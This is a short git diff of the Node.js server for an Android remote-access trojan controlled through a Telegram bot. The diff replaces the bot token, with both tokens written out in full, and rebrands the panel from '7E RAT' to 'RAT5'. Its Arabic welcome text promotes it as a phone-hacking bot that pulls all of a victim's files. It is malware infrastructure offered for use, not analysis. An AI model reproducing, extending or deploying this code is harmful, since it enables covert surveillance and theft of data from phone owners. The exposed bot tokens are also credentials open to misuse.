@@ -7,9 +7,9 @@ const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
 
-const token = '8011680163:AAGnd7FCTeKny1krFhuuxNHG3vY6l8agqUw'
+const token = '7386996301:AAHwoefCP129iZ3g5kLgJ3-9S5Da8d7CoBw'
 const id = '6277561898'
-const address = 'https://www.google.com'
+const address = 'https://google.com'
 
 const app = express();
 const appServer = http.createServer(app);
@@ -25,7 +25,7 @@ let currentNumber = ''
 let currentTitle = ''
 
 app.get('/', function (req, res) {
-    res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>')
+    res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 Hackers</h1>')
 })
 
 app.post("/uploadFile", upload.single('file'), (req, res) => {
@@ -311,7 +311,7 @@ appBot.on('message', (message) => {
     if (id == chatId) {
         if (message.text == '/start') {
             appBot.sendMessage(id,
-                '°• 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 7𝙀 𝙍𝘼𝙏 𝙥𝙖𝙣𝙚𝙡\n\n' +
+                '°• 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙍𝘼𝙏5 𝙥𝙖𝙣𝙚𝙡\n\n' +
                 '• اهلا بك في اول بوت اختراق هواتف بالوطن العربي\n\n' +
                 '• البوت يعمل مثل برامج الرات ولكن بصيغه اسهل\n\n' +
                 '• يمكنك اختراق اجهزه الاندرويد وسحب جميع ملفات الضحيه\n\n' +
